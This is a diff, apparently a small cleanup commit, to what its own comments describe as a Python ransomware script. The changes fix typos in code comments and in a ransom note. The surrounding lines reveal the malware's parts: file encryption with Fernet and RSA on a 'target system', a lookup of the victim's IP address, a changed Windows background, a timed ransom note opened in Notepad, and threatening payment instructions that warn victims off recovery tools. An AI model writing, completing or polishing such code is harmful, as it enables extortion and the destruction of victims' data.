@@ -2,12 +2,12 @@
 from cryptography.fernet import Fernet # encrypt/decrypt files on target system
 import os # to get system root
 import webbrowser # to load webbrowser to go to specific website eg bitcoin
-import ctypes # so we can intereact with windows dlls and change windows background etc
+import ctypes # so we can interact with windows dlls and change windows background etc
 import urllib.request # used for downloading and saving background image
 import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
 import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
 import datetime # to give time limit on ransom note
-import subprocess # to create process for notepad and open ransom  note
+import subprocess # to create process for notepad and open ransom note
 import win32gui # used to get window text to see if ransom note is on top of all other windows
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
@@ -165,7 +165,7 @@ To purchase your key and restore your data, please follow these three easy steps
    IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
 
 WARNING:
-Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
+Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlock your files.
 Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
 -and there is a high chance you will lose your files forever.
 Do NOT send "PAID" button without paying, price WILL go up for disobedience.
